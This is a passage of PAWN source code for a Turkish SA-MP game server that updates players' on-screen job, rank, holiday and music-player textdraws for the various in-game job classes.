						format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 4)
		            {
						format(Yazi, 300, "~w~Diger konvoy uyelerinin~n~yolcu indirmesini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		            }
		        }else{
					format(Yazi, 300, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					format(Yazi, 300, "~w~Konvoy liderinizin gorev~n~baslatmasini bekleyin.");
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		        }
		    }else{
  				if(APlayerData[playerid][JobStarted] == true)
     			{
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], "Yolcu");

					if(APlayerData[playerid][JobStep] == 1)
    				{
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     				}

					if(APlayerData[playerid][JobStep] == 2)
    				{
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     				}
        		}else{
					format(Yazi, 300, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    			}
		    }
		}
 		case ClassPilot:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}
  		case ClassPolice:
		{
			format(Yazi, 300, "Suclu Yakala");
			PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

			format(Yazi, 300, "~g~~h~~h~'RMB' ~w~Ceza Keser~n~~g~~h~~h~'LCTRL' ~w~Uyari Verir");
			PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		}
		case ClassFBY:
		{
			format(Yazi, 300, "Suclu Yakala");
			PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

			format(Yazi, 300, "~g~~h~~h~'RMB' ~w~Ceza Keser~n~~g~~h~~h~'LCTRL' ~w~Uyari Verir");
			PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
		}
   		case ClassMafia:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}
        	}else{
        	    if(APlayerData[playerid][MafiaLoadHijacked] == true)
        	    {
					format(Yazi, 300, "Calinti Yuk");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					format(Yazi, 300, "~w~Caldiginiz ~r~yuku ~w~mafya~n~mekanina goturun.");
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
        	    }else{
					format(Yazi, 300, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
				}
    		}
		}

    	case ClassRoadWorker:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
     		    if(APlayerData[playerid][JobID] == 1) // Bozuk Radar Tamiri
     		    {
 					format(Yazi, 300, "Bozuk Radar");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					format(Yazi, 300, "~r~Bozuk radarlari~n~~w~tamir edin~n~~r~~h~/goreviptal");
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     		    }

      		    if(APlayerData[playerid][JobID] == 2) // Bozuk Araç Çekme
     		    {
 					format(Yazi, 300, "Bozuk Arac");
					PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

					if(APlayerData[playerid][JobStep] == 1)
    				{
						format(Yazi, 300, "~p~%s~w~'dan~n~Hurdalik'a~n~~r~~h~/goreviptal", ABrokenVehicles[APlayerData[playerid][JobLoc1]][BrokenName]);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     				}

					if(APlayerData[playerid][JobStep] == 2)
    				{
						format(Yazi, 300, "~w~%s'dan~n~~p~Hurdalik~w~'a~n~~r~~h~/goreviptal", ABrokenVehicles[APlayerData[playerid][JobLoc1]][BrokenName]);
						PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     				}
     		    }
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}

		case ClassGemici:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], GemiciLoads[ APlayerData[playerid][LoadID] ]);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					XF = GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocX] - oX;
					YF = GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocY] - oY;
					ZF = GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
					Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					XF = GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocX] - oX;
					YF = GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocY] - oY;
					ZF = GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
					Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}

		case ClassOduncu:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], "Odun");

				format(Yazi, 300, "~w~Agac kesiliyor...~n~Surec: ~p~%d/100~n~~w~Uzerinizdeki Odun ~y~%d/20~n~~r~~h~/goreviptal", AgacTime[playerid], KesilenAgac[playerid]);
                PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Odun kesmeye baslamak~n~icin ~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}

		case ClassBalikci:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], "Balik");

				format(Yazi, 300, "~w~Balik tutuluyor...~n~Surec: ~p~%d/%d~n~~w~Uzerinizdeki Balik ~y~%d/20~n~~r~~h~/goreviptal", BalikAsama[playerid], BalikAsamaM[playerid], EldekiBalik[playerid]);
                PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Balik tutmaya baslamak~n~icin ~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}
		case ClassCopcu:
		{
			ControlCopcuGorev(playerid);
		}
		case ClassBanka:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}
		case ClassFire:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}
		case ClassPboy:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, "Pizza");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~r~Evler~w~e Pizza dagitin.~n~Dagitilan Pizza: ~p~%d/%d~n~~r~~h~/goreviptal", APlayerData[playerid][JobStep]-1, APlayerData[playerid][PboyMaxStep]);
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_GYuk[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_GYer[playerid], Yazi);
    		}
		}

	}

	// TextDrawlarý Göster
	TextDrawShowForPlayer(playerid, UI_AltBox);
	TextDrawShowForPlayer(playerid, UI_AltInfo);
	if(Skawmed[playerid] == 0)
	{
	    if(YVIP[playerid] == 1)
	    {
	        TextDrawHideForPlayer(playerid, UI_AltLogo[0]);
			//TextDrawShowForPlayer(playerid, Textdraw17);
		}else{
		    TextDrawHideForPlayer(playerid, Textdraw17);
		    TextDrawShowForPlayer(playerid, UI_AltLogo[0]);
		}
	}

	TextDrawShowForPlayer(playerid, UI_AltLogo[1]);
	TextDrawShowForPlayer(playerid, UI_UstBox);
	TextDrawShowForPlayer(playerid, UI_SaatTarih);

	TextDrawShowForPlayer(playerid, UI_OLogo);
	PlayerTextDrawShow(playerid, UI_ONick[playerid]);
	PlayerTextDrawShow(playerid, UI_OBilgi[playerid]);

	TextDrawShowForPlayer(playerid, UI_GLogo);
	PlayerTextDrawShow(playerid, UI_GYuk[playerid]);
	PlayerTextDrawShow(playerid, UI_GYer[playerid]);

	PlayerTextDrawShow(playerid, UI_Konvoy[playerid]);

	TextDrawShowForPlayer(playerid, UI_MLogo);

	if(APlayerData[playerid][PlayerWanted] > 0)
	{
		PlayerTextDrawShow(playerid, UI_WantedL[playerid]);
		if(APlayerData[playerid][PlayerWanted] > 8)
		{
		    PlayerTextDrawShow(playerid, UI_Wanted[playerid]);
		}else{
		    PlayerTextDrawHide(playerid, UI_Wanted[playerid]);
		}
	}else{
		PlayerTextDrawHide(playerid, UI_WantedL[playerid]);
		PlayerTextDrawHide(playerid, UI_Wanted[playerid]);
	}

	TextDrawShowForPlayer(playerid, UI_FLogo[0]);
	TextDrawShowForPlayer(playerid, UI_FLogo[1]);
	TextDrawShowForPlayer(playerid, UI_FLogo[2]);

	// Yýlbaþý TextDrawlarý
	if(YVIP[playerid] == 3)
	{
		TextDrawShowForPlayer(playerid, Textdraw18);
		TextDrawShowForPlayer(playerid, Textdraw19);
		TextDrawShowForPlayer(playerid, Textdraw20);
		TextDrawShowForPlayer(playerid, Textdraw21);
		TextDrawShowForPlayer(playerid, Textdraw22);
		TextDrawShowForPlayer(playerid, Textdraw23);
		TextDrawShowForPlayer(playerid, Textdraw24);
		TextDrawShowForPlayer(playerid, Textdraw25);
		TextDrawShowForPlayer(playerid, Textdraw26);
		TextDrawShowForPlayer(playerid, Textdraw27);
		TextDrawShowForPlayer(playerid, Textdraw28);
		TextDrawShowForPlayer(playerid, Textdraw29);
		TextDrawShowForPlayer(playerid, Textdraw30);
		TextDrawShowForPlayer(playerid, Textdraw31);
		TextDrawShowForPlayer(playerid, Textdraw32);
		TextDrawShowForPlayer(playerid, Textdraw33);
		TextDrawShowForPlayer(playerid, Textdraw34);
		TextDrawShowForPlayer(playerid, Textdraw35);
		TextDrawShowForPlayer(playerid, Textdraw36);
		TextDrawShowForPlayer(playerid, Textdraw37);
		TextDrawShowForPlayer(playerid, Textdraw38);
		TextDrawShowForPlayer(playerid, Textdraw39);
		TextDrawShowForPlayer(playerid, Textdraw40);
		TextDrawShowForPlayer(playerid, Textdraw41);
		TextDrawShowForPlayer(playerid, Textdraw42);
		TextDrawShowForPlayer(playerid, Textdraw43);
		TextDrawShowForPlayer(playerid, Textdraw44);
	}

	// 23 Nisan TextDrawlarý
	if(YVIP[playerid] == 1)
	{
		TextDrawShowForPlayer(playerid, Textdraw45);
		TextDrawShowForPlayer(playerid, Textdraw46);
		TextDrawShowForPlayer(playerid, Textdraw47);
	}

    Skawmed[playerid] = 1;
	return 1;
}
*/

// ************************************************************************************************************************************************************
// V5 Oyuncu Arayüzü [ EvoturK ]
// ************************************************************************************************************************************************************

/*new Text:UI_AltBar,
	PlayerText:UI_AltBilgi[MAX_PLAYERS],
	Text:UI_GMBilgi,
	Text:UI_SCBilgi,
	Text:UI_SLogo,

	Text:UI_ORBilgiL,
	PlayerText:UI_ORBilgiH[MAX_PLAYERS],
	Text:UI_OGBilgiL,
	PlayerText:UI_OGBilgiH[MAX_PLAYERS],
	PlayerText:UI_OGBilgi[MAX_PLAYERS],
	Text:UI_OKBilgiL,
	PlayerText:UI_OKBilgiH[MAX_PLAYERS],
	PlayerText:UI_OKBilgi[MAX_PLAYERS],
	Text:UI_RMBilgiL,
	Text:UI_RMBilgiH,
    Text:UI_RMBilgi,

	Text:UI_TarihSaat;
*/
//new Skawmed[MAX_PLAYERS];


new V5UI_SCTimer,
	V5UI_SCIndex,
	V5UI_AltTimer[MAX_PLAYERS],
	V5UI_AltIndex[MAX_PLAYERS];

//ShowPlayerV5UI
ShowPlayerV5UI(playerid)
{
   /* pAclikBar[playerid] = CreateProgressBar(504.00, 18.00, 55.50, 3.50, -6487809, 100.0);
	SetProgressBarValue(pAclikBar[playerid], 100.0);
	if(pAclikZaman[playerid] != -1) KillTimer(pAclikZaman[playerid]);
	pAclikZaman[playerid] = SetTimerEx("pAclikZaman_f", ACLIK_KONTROL*1000, false, "i", playerid);
    ShowProgressBarForPlayer(playerid, pAclikBar[playerid]);
    UpdateProgressBar(pAclikBar[playerid], playerid);
    
    pSusuzlukBar[playerid] = CreateProgressBar(578.00, 17.00, 55.50, 3.20, 10223615, 100.0);
	SetProgressBarValue(pSusuzlukBar[playerid], 100.0);
	if(pSusuzlukZaman[playerid] != -1) KillTimer(pSusuzlukZaman[playerid]);
	pSusuzlukZaman[playerid] = SetTimerEx("pSusuzlukZaman_f", SUSUZLUK_KONTROL*1000, false, "i", playerid);
    ShowProgressBarForPlayer(playerid, pSusuzlukBar[playerid]);
    UpdateProgressBar(pSusuzlukBar[playerid], playerid);
    
    pBarKullan[playerid] = 1;
    
    */
	TextDrawHideForPlayer(playerid, UI_AltBar);
	PlayerTextDrawHide(playerid, UI_AltBilgi[playerid]);
	TextDrawHideForPlayer(playerid, UI_GMBilgi);
	TextDrawHideForPlayer(playerid, UI_SCBilgi);
	new year,month,day;
	getdate(year, month, day);
	if(day == 31 && month == 8 || day == 1 && month == 9 || day == 2 && month == 9 || day == 3 && month == 9)
	{
        TextDrawHideForPlayer(playerid, Textdraw45);
		TextDrawHideForPlayer(playerid, Textdraw46);
		TextDrawHideForPlayer(playerid, Textdraw47);
		TextDrawHideForPlayer(playerid, Textdraw48);
	}else{
 	TextDrawHideForPlayer(playerid, UI_SLogo);
 	}

	TextDrawHideForPlayer(playerid, UI_ORBilgiL);
	PlayerTextDrawHide(playerid, UI_ORBilgiH[playerid]);

	TextDrawHideForPlayer(playerid, UI_OGBilgiL);
	PlayerTextDrawHide(playerid, UI_OGBilgiH[playerid]);
	PlayerTextDrawHide(playerid, UI_OGBilgi[playerid]);

	TextDrawHideForPlayer(playerid, UI_OKBilgiL);
	PlayerTextDrawHide(playerid, UI_OKBilgiH[playerid]);
	PlayerTextDrawHide(playerid, UI_OKBilgi[playerid]);

	PlayerTextDrawHide(playerid, UI_WantedL[playerid]);
	PlayerTextDrawHide(playerid, UI_Wanted[playerid]);

	TextDrawHideForPlayer(playerid, UI_RMBilgiL);
	TextDrawHideForPlayer(playerid, UI_RMBilgiH);
	TextDrawHideForPlayer(playerid, UI_RMBilgi);

	TextDrawHideForPlayer(playerid, UI_TarihSaat);

	 // Yýlbaþý TextDrawlarý
	TextDrawHideForPlayer(playerid, Textdraw17);
	TextDrawHideForPlayer(playerid, Textdraw18);
	TextDrawHideForPlayer(playerid, Textdraw19);
	TextDrawHideForPlayer(playerid, Textdraw20);
	TextDrawHideForPlayer(playerid, Textdraw21);
	TextDrawHideForPlayer(playerid, Textdraw22);
	TextDrawHideForPlayer(playerid, Textdraw23);
	TextDrawHideForPlayer(playerid, Textdraw24);
	TextDrawHideForPlayer(playerid, Textdraw25);
	TextDrawHideForPlayer(playerid, Textdraw26);
	TextDrawHideForPlayer(playerid, Textdraw27);
	TextDrawHideForPlayer(playerid, Textdraw28);
	TextDrawHideForPlayer(playerid, Textdraw29);
	TextDrawHideForPlayer(playerid, Textdraw30);
	TextDrawHideForPlayer(playerid, Textdraw31);
	TextDrawHideForPlayer(playerid, Textdraw32);
	TextDrawHideForPlayer(playerid, Textdraw33);
	TextDrawHideForPlayer(playerid, Textdraw34);
	TextDrawHideForPlayer(playerid, Textdraw35);
	TextDrawHideForPlayer(playerid, Textdraw36);
	TextDrawHideForPlayer(playerid, Textdraw37);
	TextDrawHideForPlayer(playerid, Textdraw38);
	TextDrawHideForPlayer(playerid, Textdraw39);
	TextDrawHideForPlayer(playerid, Textdraw40);
	TextDrawHideForPlayer(playerid, Textdraw41);
	TextDrawHideForPlayer(playerid, Textdraw42);
	TextDrawHideForPlayer(playerid, Textdraw43);
	TextDrawHideForPlayer(playerid, Textdraw44);

	// 23 Nisan TextDrawlarý
	TextDrawHideForPlayer(playerid, Textdraw45);
	TextDrawHideForPlayer(playerid, Textdraw46);
	TextDrawHideForPlayer(playerid, Textdraw47);
	TextDrawHideForPlayer(playerid, Textdraw48);

	if(APlayerSpawnData[playerid] == false || TextKapat[playerid] == 1) return 1;

	TextDrawShowForPlayer(playerid, UI_AltBar);
	PlayerTextDrawShow(playerid, UI_AltBilgi[playerid]);
	TextDrawShowForPlayer(playerid, UI_GMBilgi);
	TextDrawShowForPlayer(playerid, UI_SCBilgi);
    if(day == 31 && month == 8 || day == 1 && month == 9 || day == 2 && month == 9 || day == 3 && month == 9)
	{
		TextDrawShowForPlayer(playerid, Textdraw45);
		TextDrawShowForPlayer(playerid, Textdraw46);
		TextDrawShowForPlayer(playerid, Textdraw47);
		TextDrawShowForPlayer(playerid, Textdraw48);
	}else if(day == 23 && month == 4)
	{
		TextDrawShowForPlayer(playerid, Textdraw45);
		TextDrawShowForPlayer(playerid, Textdraw46);
		TextDrawShowForPlayer(playerid, Textdraw47);
 	}else if(day == 1 && month == 5)
	{
		TextDrawShowForPlayer(playerid, Textdraw45);
		TextDrawShowForPlayer(playerid, Textdraw46);
		TextDrawShowForPlayer(playerid, Textdraw47);
	}else if((day >= 11 && month == 12) || (day <= 2 && month == 1))
	{
		TextDrawShowForPlayer(playerid, Textdraw17);
 		TextDrawShowForPlayer(playerid, Textdraw18);
		TextDrawShowForPlayer(playerid, Textdraw19);
		TextDrawShowForPlayer(playerid, Textdraw20);
		TextDrawShowForPlayer(playerid, Textdraw21);
		TextDrawShowForPlayer(playerid, Textdraw22);
		TextDrawShowForPlayer(playerid, Textdraw23);
		TextDrawShowForPlayer(playerid, Textdraw24);
		TextDrawShowForPlayer(playerid, Textdraw25);
		TextDrawShowForPlayer(playerid, Textdraw26);
		TextDrawShowForPlayer(playerid, Textdraw27);
		TextDrawShowForPlayer(playerid, Textdraw28);
		TextDrawShowForPlayer(playerid, Textdraw29);
		TextDrawShowForPlayer(playerid, Textdraw30);
		TextDrawShowForPlayer(playerid, Textdraw31);
		TextDrawShowForPlayer(playerid, Textdraw32);
		TextDrawShowForPlayer(playerid, Textdraw33);
		TextDrawShowForPlayer(playerid, Textdraw34);
		TextDrawShowForPlayer(playerid, Textdraw35);
		TextDrawShowForPlayer(playerid, Textdraw36);
		TextDrawShowForPlayer(playerid, Textdraw37);
		TextDrawShowForPlayer(playerid, Textdraw38);
		TextDrawShowForPlayer(playerid, Textdraw39);
		TextDrawShowForPlayer(playerid, Textdraw40);
		TextDrawShowForPlayer(playerid, Textdraw41);
		TextDrawShowForPlayer(playerid, Textdraw42);
		TextDrawShowForPlayer(playerid, Textdraw43);
		TextDrawShowForPlayer(playerid, Textdraw44);
	}else{
		TextDrawShowForPlayer(playerid, UI_SLogo);
	}

	TextDrawShowForPlayer(playerid, UI_ORBilgiL);
	PlayerTextDrawShow(playerid, UI_ORBilgiH[playerid]);

	TextDrawShowForPlayer(playerid, UI_OGBilgiL);
	PlayerTextDrawShow(playerid, UI_OGBilgiH[playerid]);
	PlayerTextDrawShow(playerid, UI_OGBilgi[playerid]);

	if(APlayerData[playerid][InConvoy] == true)
	{
		TextDrawShowForPlayer(playerid, UI_OKBilgiL);
		PlayerTextDrawShow(playerid, UI_OKBilgiH[playerid]);
		PlayerTextDrawShow(playerid, UI_OKBilgi[playerid]);
	}

	TextDrawShowForPlayer(playerid, UI_TarihSaat);

	return 1;
}

// UpdatePlayerV5UI
UpdatePlayerV5UI(playerid)
{
	new Yazi[512];

	// Alt Bilgi
	V5UI_AltTimer[playerid]++;
	if(V5UI_AltTimer[playerid] == 5)
	{
	    V5UI_AltTimer[playerid] = 0;
	    V5UI_AltIndex[playerid]++;
	    if(V5UI_AltIndex[playerid] == 2) V5UI_AltIndex[playerid] = 0;

	    switch(V5UI_AltIndex[playerid])
	    {
	        case 0: PlayerTextDrawSetString(playerid, UI_AltBilgi[playerid], "~b~~h~/~w~yardim ~b~~h~/~w~komutlar ~b~~h~/~w~kurallar ~b~~h~/~w~market ~b~~h~/~w~yenilikler ~b~~h~/~g~~h~~h~vipbilgi ~b~~h~/~g~~h~~h~donator");
	        case 1:
			{
				switch(MPMode[playerid])
				{
					case 0: // Kapalý
					{
						PlayerTextDrawSetString(playerid, UI_AltBilgi[playerid], "~r~~h~Muzik Calar'iniz Kapali ~w~MP3 Arsiv ~y~/mp3 ~w~RadyoTM ~y~/sac");
					}

					case 1: // Server
					{
						if(CalanMP3ID == -1)
						{
					    	format(Yazi, 512, "~r~~h~Yayin suan kapali. ~w~' Muzik calari kapatmak icin ~r~/skapat");
					    	PlayerTextDrawSetString(playerid, UI_AltBilgi[playerid], Yazi);
						}else{
					    	format(Yazi, 512, "%d- ~b~~h~~h~~h~%s ~w~@ ~r~~h~Canakkale Meslek Sunucusu ~w~' Muzigi kapatmak icin ~r~/skapat", CalanMP3ID, CalanMP3Name);
					    	PlayerTextDrawSetString(playerid, UI_AltBilgi[playerid], Yazi);
						}
					}

					case 2: // Oyuncu Muzik
					{
						format(Yazi, 1024, "~b~~h~~h~~h~%s ~w~@ ~r~~h~MUZIK CALAR ~w~' Muzigi kapatmak icin ~r~/skapat", MPName[playerid]);
			  			PlayerTextDrawSetString(playerid, UI_AltBilgi[playerid], Yazi);
					}

					case 3: // Radyo Muzik
					{
						format(Yazi, 1024, "~b~~h~~h~~h~%s ~w~@ ~r~~h~RADYO CALAR ~w~' Muzigi kapatmak icin ~r~/skapat", MPName[playerid]);
			  			PlayerTextDrawSetString(playerid, UI_AltBilgi[playerid], Yazi);
					}
				}
			}
		}
	}

	// Oyuncu Rank TextDraw
	switch(APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], TruckerRanks[ Rank[playerid] ][RankName]);
		case ClassBusDriver: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], BusDriverRanks[ Rank[playerid] ][RankName]);
 		case ClassDolmusDriver: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], DolmusDriverRanks[ Rank[playerid] ][RankName]);
 		case ClassPilot: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], PilotRanks[ Rank[playerid] ][RankName]);
